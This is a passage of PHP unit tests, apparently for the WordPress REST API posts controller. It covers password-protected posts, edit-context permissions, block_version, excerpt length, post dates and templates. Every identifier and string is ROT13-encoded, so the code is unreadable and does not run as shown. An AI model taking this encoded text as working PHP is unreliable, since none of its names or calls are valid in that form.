		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_vq', $erfcbafr, 404 );
	}

	choyvp shapgvba grfg_trg_cbfg_yvfg_pbagrkg_jvgu_crezvffvba() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_dhrel_cnenzf(
			neenl(
				'pbagrkg' => 'rqvg',
			)
		);

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->purpx_trg_cbfgf_erfcbafr( $erfcbafr, 'rqvg' );
	}

	choyvp shapgvba grfg_trg_cbfg_yvfg_pbagrkg_jvgubhg_crezvffvba() {
		jc_frg_pheerag_hfre( 0 );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_dhrel_cnenzf(
			neenl(
				'pbagrkg' => 'rqvg',
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_sbeovqqra_pbagrkg', $erfcbafr, 401 );
	}

	choyvp shapgvba grfg_trg_cbfg_pbagrkg_jvgubhg_crezvffvba() {
		jc_frg_pheerag_hfre( 0 );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$erdhrfg->frg_dhrel_cnenzf(
			neenl(
				'pbagrkg' => 'rqvg',
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_sbeovqqra_pbagrkg', $erfcbafr, 401 );
	}

	choyvp shapgvba grfg_trg_cbfg_jvgu_cnffjbeq() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_cnffjbeq' => '$vaguronananfgnaq',
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/cbfgf/%q', $cbfg_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->purpx_trg_cbfg_erfcbafr( $erfcbafr, 'ivrj' );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( '', $qngn['pbagrag']['eraqrerq'] );
		$guvf->nffregGehr( $qngn['pbagrag']['cebgrpgrq'] );
		$guvf->nffregFnzr( '', $qngn['rkprecg']['eraqrerq'] );
		$guvf->nffregGehr( $qngn['rkprecg']['cebgrpgrq'] );
	}

	choyvp shapgvba grfg_trg_cbfg_jvgu_cnffjbeq_hfvat_cnffjbeq() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_cnffjbeq' => '$vaguronananfgnaq',
				'cbfg_pbagrag'  => 'Fbzr frperg pbagrag.',
				'cbfg_rkprecg'  => 'Fbzr frperg rkprecg.',
			)
		);

		$cbfg = trg_cbfg( $cbfg_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/cbfgf/%q', $cbfg_vq ) );
		$erdhrfg->frg_cnenz( 'cnffjbeq', '$vaguronananfgnaq' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->purpx_trg_cbfg_erfcbafr( $erfcbafr, 'ivrj' );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( jcnhgbc( $cbfg->cbfg_pbagrag ), $qngn['pbagrag']['eraqrerq'] );
		$guvf->nffregGehr( $qngn['pbagrag']['cebgrpgrq'] );
		$guvf->nffregFnzr( jcnhgbc( $cbfg->cbfg_rkprecg ), $qngn['rkprecg']['eraqrerq'] );
		$guvf->nffregGehr( $qngn['rkprecg']['cebgrpgrq'] );
	}

	choyvp shapgvba grfg_trg_cbfg_jvgu_cnffjbeq_hfvat_vapbeerpg_cnffjbeq() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_cnffjbeq' => '$vaguronananfgnaq',
			)
		);

		$cbfg = trg_cbfg( $cbfg_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/cbfgf/%q', $cbfg_vq ) );
		$erdhrfg->frg_cnenz( 'cnffjbeq', 'jebatcnffjbeq' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vapbeerpg_cnffjbeq', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_trg_cbfg_jvgu_cnffjbeq_jvgubhg_crezvffvba() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_cnffjbeq' => '$vaguronananfgnaq',
				'cbfg_pbagrag'  => 'Fbzr frperg pbagrag.',
				'cbfg_rkprecg'  => 'Fbzr frperg rkprecg.',
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/cbfgf/%q', $cbfg_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->purpx_trg_cbfg_erfcbafr( $erfcbafr, 'ivrj' );
		$guvf->nffregFnzr( '', $qngn['pbagrag']['eraqrerq'] );
		$guvf->nffregGehr( $qngn['pbagrag']['cebgrpgrq'] );
		$guvf->nffregFnzr( '', $qngn['rkprecg']['eraqrerq'] );
		$guvf->nffregGehr( $qngn['rkprecg']['cebgrpgrq'] );
	}

	/**
	 * @gvpxrg 61837
	 */
	choyvp shapgvba grfg_trg_vgrz_crezvffvbaf_purpx_juvyr_hcqngvat_cnffjbeq() {
		$raqcbvag = arj JC_ERFG_Cbfgf_Pbagebyyre( 'cbfg' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$erdhrfg->frg_hey_cnenzf( neenl( 'vq' => frys::$cbfg_vq ) );
		$erdhrfg->frg_obql_cnenzf(
			$guvf->frg_cbfg_qngn(
				neenl(
					'vq'       => frys::$cbfg_vq,
					'cnffjbeq' => '123',
				)
			)
		);
		$crezvffvba = $raqcbvag->trg_vgrz_crezvffvbaf_purpx( $erdhrfg );

		// Cnffjbeq cebivqrq va CBFG qngn, fubhyq abg or hfrq nf nhguragvpngvba.
		$guvf->nffregAbgJCReebe( $crezvffvba, 'Cnffjbeq va cbfg obql fubhyq or vtaberq ol crezvffvbaf purpx.' );
		$guvf->nffregGehr( $crezvffvba );
	}

	/**
	 * @gvpxrg 61837
	 */
	choyvp shapgvba grfg_trg_vgrz_crezvffvbaf_purpx_juvyr_hcqngvat_cnffjbeq_jvgu_vainyvq_glcr() {
		$raqcbvag = arj JC_ERFG_Cbfgf_Pbagebyyre( 'cbfg' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$erdhrfg->frg_hey_cnenzf( neenl( 'vq' => frys::$cbfg_vq ) );
		$erdhrfg->frg_obql_cnenzf(
			$guvf->frg_cbfg_qngn(
				neenl(
					'vq'       => frys::$cbfg_vq,
					'cnffjbeq' => 123,
				)
			)
		);
		$crezvffvba = $raqcbvag->trg_vgrz_crezvffvbaf_purpx( $erdhrfg );

		$guvf->nffregAbgJCReebe( $crezvffvba, 'Cnffjbeq va cbfg obql fubhyq or vtaberq ol crezvffvbaf purpx rira jura vg vf na vainyvq glcr.' );
		$guvf->nffregGehr( $crezvffvba );
	}

	/**
	 * Gur cbfg erfcbafr fubhyq abg unir `oybpx_irefvba` jura va ivrj pbagrkg.
	 *
	 * @gvpxrg 43887
	 */
	choyvp shapgvba grfg_trg_cbfg_fubhyq_abg_unir_oybpx_irefvba_jura_pbagrkg_ivrj() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => '<!-- jc:pber/frcnengbe -->',
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/cbfgf/%q', $cbfg_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlAbgUnfXrl( 'oybpx_irefvba', $qngn['pbagrag'] );
	}

	/**
	 * Gur cbfg erfcbafr fubhyq unir `oybpx_irefvba` vaqvpngr gung oybpx pbagrag vf cerfrag jura va rqvg pbagrkg.
	 *
	 * @gvpxrg 43887
	 */
	choyvp shapgvba grfg_trg_cbfg_fubhyq_unir_oybpx_irefvba_vaqvpngr_oybpx_pbagrag_jura_pbagrkg_rqvg() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => '<!-- jc:pber/frcnengbe -->',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/cbfgf/%q', $cbfg_vq ) );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 1, $qngn['pbagrag']['oybpx_irefvba'] );
	}

	/**
	 * Gur cbfg erfcbafr fubhyq unir `oybpx_irefvba` vaqvpngr gung ab oybpx pbagrag vf cerfrag jura va rqvg pbagrkg.
	 *
	 * @gvpxrg 43887
	 */
	choyvp shapgvba grfg_trg_cbfg_fubhyq_unir_oybpx_irefvba_vaqvpngr_ab_oybpx_pbagrag_jura_pbagrkg_rqvg() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => '<ue />',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/cbfgf/%q', $cbfg_vq ) );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 0, $qngn['pbagrag']['oybpx_irefvba'] );
	}

	choyvp shapgvba grfg_trg_vgrz_ernq_crezvffvba_phfgbz_cbfg_fgnghf_abg_nhguragvpngrq() {
		ertvfgre_cbfg_fgnghf( 'grfgchofgnghf', neenl( 'choyvp' => gehr ) );
		ertvfgre_cbfg_fgnghf( 'grfgcevignghf', neenl( 'choyvp' => snyfr ) );

		// Choyvp fgnghf.
		jc_hcqngr_cbfg(
			neenl(
				'VQ'          => frys::$cbfg_vq,
				'cbfg_fgnghf' => 'grfgchofgnghf',
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		// Cevingr fgnghf.
		jc_hcqngr_cbfg(
			neenl(
				'VQ'          => frys::$cbfg_vq,
				'cbfg_fgnghf' => 'grfgcevignghf',
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 401, $erfcbafr->trg_fgnghf() );
	}

	choyvp shapgvba grfg_cercner_vgrz() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'pbagrkg' => 'rqvg' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->purpx_trg_cbfg_erfcbafr( $erfcbafr, 'rqvg' );
	}

	choyvp shapgvba grfg_cercner_vgrz_yvzvg_svryqf() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$raqcbvag = arj JC_ERFG_Cbfgf_Pbagebyyre( 'cbfg' );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erdhrfg->frg_cnenz( '_svryqf', 'vq,fyht' );
		$bow      = trg_cbfg( frys::$cbfg_vq );
		$erfcbafr = $raqcbvag->cercner_vgrz_sbe_erfcbafr( $bow, $erdhrfg );
		$guvf->nffregFnzr(
			neenl(
				'vq',
				'fyht',
			),
			neenl_xrlf( $erfcbafr->trg_qngn() )
		);
	}

	/**
	 * @gvpxrg 42094
	 */
	choyvp shapgvba grfg_cercner_vgrz_svygref_pbagrag_jura_arrqrq() {
		$svygre_pbhag   = 0;
		$svygre_pbagrag = fgngvp shapgvba () hfr ( &$svygre_pbhag ) {
			++$svygre_pbhag;
			erghea '<c>Svygrerq pbagrag.</c>';
		};
		nqq_svygre( 'gur_pbagrag', $svygre_pbagrag );

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$raqcbvag = arj JC_ERFG_Cbfgf_Pbagebyyre( 'cbfg' );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );

		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erdhrfg->frg_cnenz( '_svryqf', 'pbagrag.eraqrerq' );

		$cbfg     = trg_cbfg( frys::$cbfg_vq );
		$erfcbafr = $raqcbvag->cercner_vgrz_sbe_erfcbafr( $cbfg, $erdhrfg );

		erzbir_svygre( 'gur_pbagrag', $svygre_pbagrag );

		$guvf->nffregFnzr(
			neenl(
				'vq'      => frys::$cbfg_vq,
				'pbagrag' => neenl(
					'eraqrerq' => '<c>Svygrerq pbagrag.</c>',
				),
			),
			$erfcbafr->trg_qngn()
		);
		$guvf->nffregFnzr( 1, $svygre_pbhag );
	}

	/**
	 * @gvpxrg 42094
	 */
	choyvp shapgvba grfg_cercner_vgrz_fxvcf_pbagrag_svygre_vs_abg_arrqrq() {
		$svygre_pbhag   = 0;
		$svygre_pbagrag = fgngvp shapgvba () hfr ( &$svygre_pbhag ) {
			++$svygre_pbhag;
			erghea '<c>Svygrerq pbagrag.</c>';
		};
		nqq_svygre( 'gur_pbagrag', $svygre_pbagrag );

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$raqcbvag = arj JC_ERFG_Cbfgf_Pbagebyyre( 'cbfg' );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );

		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erdhrfg->frg_cnenz( '_svryqf', 'pbagrag.enj' );

		$cbfg     = trg_cbfg( frys::$cbfg_vq );
		$erfcbafr = $raqcbvag->cercner_vgrz_sbe_erfcbafr( $cbfg, $erdhrfg );

		erzbir_svygre( 'gur_pbagrag', $svygre_pbagrag );

		$guvf->nffregFnzr(
			neenl(
				'vq'      => $cbfg->VQ,
				'pbagrag' => neenl(
					'enj' => $cbfg->cbfg_pbagrag,
				),
			),
			$erfcbafr->trg_qngn()
		);
		$guvf->nffregFnzr( 0, $svygre_pbhag );
	}

	/**
	 * @gvpxrg 59043
	 *
	 * @pbiref JC_ERFG_Cbfgf_Pbagebyyre::cercner_vgrz_sbe_erfcbafr
	 */
	choyvp shapgvba grfg_cercner_vgrz_bireevqr_rkprecg_yratgu() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_rkprecg' => '',
				'cbfg_pbagrag' => 'Onpba vcfhz qbybe nzrg cbepurggn pncvpbyn fveybva cebfpvhggb oevfxrg funaxyr wrexl. Unz ubpx svyrg zvtaba obhqva tebhaq ebhaq, cebfpvhggb nypngen fcner evof zrngonyy gheqhpxra cbex orrs evof unz orrs. Onpba cnfgenzv fubeg ybva, iravfba gev-gvc unz fubeg evof qbare fjvar. Graqreybva cvt gbathr cbex wbjy qbare. Cbex ybva ehzc g-obar, orrs fgevc fgrnx synax qehzfgvpx gev-gvc fubeg ybva pncvpbyn wbjy. Pbj svyrg zvtaba unzohetre qbare ehzc. Fubeg ybva wbjy qehzfgvpx, gbathr gnvy orrs evof cnaprggn synax oevfxrg ynaqwnrtre puhpx iravfba senaxshegre ghexrl.

Oevfxrg funax ehzc, gbathr orrs evof fjvar sngonpx gheqhpxra pncvpbyn zrngonyy cvpnaun puvpxra phcvz zrngybns ghexrl. Onpba ovygbat fubhyqre gnvy senaxshegre obhqva phcvz ghexrl qehzfgvpx. Cbepurggn cvt fubhyqre, wrexl synax cbex gnvy zrngonyy unzohetre. Qbare unz ubpx evorlr gnvy wrexl fjvar. Yrorexnf evorlr cnaprggn, graqreybva pncvpbyn qbare gheqhpxra puvpxra iravfba tebhaq ebhaq obhqva cbex pubc. Gnvy cbex ybva cvt fcner evof, ovygbat evorlr oevfxrg cbex pubc phcvz. Fubeg ybva yrorexnf fcner evof wbjy ynaqwnrtre gbathr xriva synax onpba cebfpvhggb.

Funaxyr cbex pubc cebfpvhggb evorlr unz ubpx cnfgenzv. G-obar funax oevfxrg onpba cbex pubc. Phcvz unzohetre cbex ybva fubeg ybva. Obhqva onyy gvc phcvz tebhaq ebhaq unz fubhyqre. Fnhfntr ehzc pbj gbathr oerfnbyn cbex cnaprggn ovygbat gnvy puvpxra ghexrl unzohetre. Xriva synax cbex ybva fnynzv ovygbat. Nypngen ynaqwnrtre cnfgenzv naqbhvyyr xvryonfn unz graqreybva qehzfgvpx fnhfntr gheqhpxra gbathr pbearq orrs.',
			)
		);

		$raqcbvag = arj JC_ERFG_Cbfgf_Pbagebyyre( 'cbfg' );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/cbfgf/%q', $cbfg_vq ) );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erdhrfg->frg_cnenz( '_svryqf', 'rkprecg' );
		$erdhrfg->frg_cnenz( 'rkprecg_yratgu', 43 );
		$erfcbafr = $raqcbvag->cercner_vgrz_sbe_erfcbafr( trg_cbfg( $cbfg_vq ), $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'rkprecg', $qngn, 'Erfcbafr zhfg pbagnva na \"rkprecg\" xrl.' );

		// 43 jbeqf cyhf gur ryyvcfvf nqqrq ivn gur 'rkprecg_zber' svygre.
		$guvf->nffregPbhag(
			44,
			rkcybqr( ' ', $qngn['rkprecg']['eraqrerq'] ),
			'Vapbeerpg jbeq pbhag va gur rkprecg. Rkcrpgrq gur rkprecg gb pbagnva 44 jbeqf (43 jbeqf cyhf na ryyvcfvf), ohg n qvssrerag jbeq pbhag jnf sbhaq.'
		);
	}

	choyvp shapgvba grfg_perngr_vgrz() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$erdhrfg->nqq_urnqre( 'pbagrag-glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$cnenzf = $guvf->frg_cbfg_qngn();
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->purpx_perngr_cbfg_erfcbafr( $erfcbafr );
	}

	choyvp shapgvba qngn_cbfg_qngrf() {
		$nyy_fgnghfrf = neenl(
			'qensg',
			'choyvfu',
			'shgher',
			'craqvat',
			'cevingr',
		);

		$pnfrf_fubeg = neenl(
			'frg qngr jvgubhg gvzrmbar'     => neenl(
				'fgnghfrf' => $nyy_fgnghfrf,
				'cnenzf'   => neenl(
					'gvzrmbar_fgevat' => 'Nzrevpn/Arj_Lbex',
					'qngr'            => '2016-12-12G14:00:00',
				),
				'erfhygf'  => neenl(
					'qngr'     => '2016-12-12G14:00:00',
					'qngr_tzg' => '2016-12-12G19:00:00',
				),
			),
			'frg qngr_tzg jvgubhg gvzrmbar' => neenl(
				'fgnghfrf' => $nyy_fgnghfrf,
				'cnenzf'   => neenl(
					'gvzrmbar_fgevat' => 'Nzrevpn/Arj_Lbex',
					'qngr_tzg'        => '2016-12-12G19:00:00',
				),
				'erfhygf'  => neenl(
					'qngr'     => '2016-12-12G14:00:00',
					'qngr_tzg' => '2016-12-12G19:00:00',
				),
			),
			'frg qngr jvgu gvzrmbar'        => neenl(
				'fgnghfrf' => neenl( 'qensg', 'choyvfu' ),
				'cnenzf'   => neenl(
					'gvzrmbar_fgevat' => 'Nzrevpn/Arj_Lbex',
					'qngr'            => '2016-12-12G18:00:00-01:00',
				),
				'erfhygf'  => neenl(
					'qngr'     => '2016-12-12G14:00:00',
					'qngr_tzg' => '2016-12-12G19:00:00',
				),
			),
			'frg qngr_tzg jvgu gvzrmbar'    => neenl(
				'fgnghfrf' => neenl( 'qensg', 'choyvfu' ),
				'cnenzf'   => neenl(
					'gvzrmbar_fgevat' => 'Nzrevpn/Arj_Lbex',
					'qngr_tzg'        => '2016-12-12G18:00:00-01:00',
				),
				'erfhygf'  => neenl(
					'qngr'     => '2016-12-12G14:00:00',
					'qngr_tzg' => '2016-12-12G19:00:00',
				),
			),
		);

		$pnfrf = neenl();
		sbernpu ( $pnfrf_fubeg nf $qrfpevcgvba => $pnfr ) {
			sbernpu ( $pnfr['fgnghfrf'] nf $fgnghf ) {
				$pnfrf[ $qrfpevcgvba . ', fgnghf=' . $fgnghf ] = neenl(
					$fgnghf,
					$pnfr['cnenzf'],
					$pnfr['erfhygf'],
				);
			}
		}

		erghea $pnfrf;
	}

	/**
	 * @qngnCebivqre qngn_cbfg_qngrf
	 */
	choyvp shapgvba grfg_perngr_cbfg_qngr( $fgnghf, $cnenzf, $erfhygf ) {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		hcqngr_bcgvba( 'gvzrmbar_fgevat', $cnenzf['gvzrmbar_fgevat'] );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'fgnghf', $fgnghf );
		$erdhrfg->frg_cnenz( 'gvgyr', 'abg rzcgl' );
		vs ( vffrg( $cnenzf['qngr'] ) ) {
			$erdhrfg->frg_cnenz( 'qngr', $cnenzf['qngr'] );
		}
		vs ( vffrg( $cnenzf['qngr_tzg'] ) ) {
			$erdhrfg->frg_cnenz( 'qngr_tzg', $cnenzf['qngr_tzg'] );
		}
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		hcqngr_bcgvba( 'gvzrmbar_fgevat', '' );

		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$cbfg = trg_cbfg( $qngn['vq'] );

		$guvf->nffregFnzr( $erfhygf['qngr'], $qngn['qngr'] );
		$cbfg_qngr = fge_ercynpr( 'G', ' ', $erfhygf['qngr'] );
		$guvf->nffregFnzr( $cbfg_qngr, $cbfg->cbfg_qngr );

		$guvf->nffregFnzr( $erfhygf['qngr_tzg'], $qngn['qngr_tzg'] );
		$cbfg_qngr_tzg = fge_ercynpr( 'G', ' ', $erfhygf['qngr_tzg'] );
		$guvf->nffregFnzr( $cbfg_qngr_tzg, $cbfg->cbfg_qngr_tzg );
	}

	/**
	 * @gvpxrg 38698
	 */
	choyvp shapgvba grfg_perngr_vgrz_jvgu_grzcyngr() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		nqq_svygre( 'gurzr_cbfg_grzcyngrf', neenl( $guvf, 'svygre_gurzr_cbfg_grzcyngrf' ) );

		// Er-ertvfgre gur ebhgr nf jr abj unir n grzcyngr ninvynoyr.
		$TYBONYF['jc_erfg_freire']->bireevqr_ol_qrsnhyg = gehr;
		$pbagebyyre                                     = arj JC_ERFG_Cbfgf_Pbagebyyre( 'cbfg' );
		$pbagebyyre->ertvfgre_ebhgrf();
		$TYBONYF['jc_erfg_freire']->bireevqr_ol_qrsnhyg = snyfr;

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'grzcyngr' => 'cbfg-zl-grfg-grzcyngr.cuc',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$qngn          = $erfcbafr->trg_qngn();
		$cbfg_grzcyngr = trg_cntr_grzcyngr_fyht( trg_cbfg( $qngn['vq'] ) );

		erzbir_svygre( 'gurzr_cbfg_grzcyngrf', neenl( $guvf, 'svygre_gurzr_cbfg_grzcyngrf' ) );

		$guvf->nffregFnzr( 'cbfg-zl-grfg-grzcyngr.cuc', $qngn['grzcyngr'] );
		$guvf->nffregFnzr( 'cbfg-zl-grfg-grzcyngr.cuc', $cbfg_grzcyngr );
	}

	/**
	 * @gvpxrg 38698
	 */
	choyvp shapgvba grfg_perngr_vgrz_jvgu_grzcyngr_abar_ninvynoyr() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'grzcyngr' => 'cbfg-zl-grfg-grzcyngr.cuc',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 38877
	 */
	choyvp shapgvba grfg_perngr_vgrz_jvgu_grzcyngr_abar() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		nqq_svygre( 'gurzr_cbfg_grzcyngrf', neenl( $guvf, 'svygre_gurzr_cbfg_grzcyngrf' ) );
		hcqngr_cbfg_zrgn( frys::$cbfg_vq, '_jc_cntr_grzcyngr', 'cbfg-zl-grfg-grzcyngr.cuc' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'grzcyngr' => '',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$qngn          = $erfcbafr->trg_qngn();
		$cbfg_grzcyngr = trg_cntr_grzcyngr_fyht( trg_cbfg( $qngn['vq'] ) );

		$guvf->nffregFnzr( '', $qngn['grzcyngr'] );
		$guvf->nffregFnzr( '', $cbfg_grzcyngr );
	}

	choyvp shapgvba grfg_erfg_perngr_vgrz() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$erdhrfg->nqq_urnqre( 'pbagrag-glcr', 'nccyvpngvba/wfba' );
		$cnenzf = $guvf->frg_cbfg_qngn();
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->purpx_perngr_cbfg_erfcbafr( $erfcbafr );
	}

	choyvp shapgvba grfg_perngr_cbfg_vainyvq_vq() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'vq' => '3',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_rkvfgf', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_perngr_cbfg_nf_pbagevohgbe() {
		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );

		hcqngr_bcgvba( 'gvzrmbar_fgevat', 'Nzrevpn/Puvpntb' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				// Guvf erfhygf va n fcrpvny `cbfg_qngr_tzg` inyhr
				// bs '0000-00-00 00:00:00'. Frr #38883.
				'fgnghf' => 'craqvat',
			)
		);

		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );

		$qngn = $erfcbafr->trg_qngn();
		$cbfg = trg_cbfg( $qngn['vq'] );
		$guvf->nffregFnzr( '0000-00-00 00:00:00', $cbfg->cbfg_qngr_tzg );
		$guvf->nffregAbgRdhnyf( '0000-00-00G00:00:00', $qngn['qngr_tzg'] );

		$guvf->purpx_perngr_cbfg_erfcbafr( $erfcbafr );

		hcqngr_bcgvba( 'gvzrmbar_fgevat', '' );
	}

	choyvp shapgvba grfg_perngr_cbfg_fgvpxl() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
